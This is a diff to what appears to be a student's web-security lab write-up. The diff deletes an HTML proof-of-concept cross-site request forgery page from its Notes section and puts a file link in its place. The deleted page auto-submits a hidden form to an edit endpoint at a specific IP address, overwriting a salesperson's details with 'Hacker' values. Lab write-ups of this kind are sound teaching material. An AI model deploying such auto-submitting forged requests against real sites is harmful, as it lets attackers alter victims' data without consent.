@@ -41,15 +41,7 @@ This one, I used postman to fire the POST request. After logging in as admin, I 
 
 
 ## Notes
-<!-- HTML CODE-->
-  <body onload="document.csrf.submit()">
-    <form action="https://35.184.197.255/red/public/staff/salespeople/edit.php?id=7" method="POST" name="csrf" style="display: none;" target="hidden_results" >
-      <input type="text" name="first_name" value="Hacker"><br>
-      <input type="text" name="last_name" value="Hacker"><br>
-      <input type="text" name="phone" value="999-999-9999"><br>
-      <input type="text" name="email" value="hacker@hacker.com"><br>
-    </form>
-  </body>
+https://drive.google.com/file/d/0BzsBD-G31f93Z25FcE9PVnVIdlk/view?usp=sharing
 
 
 
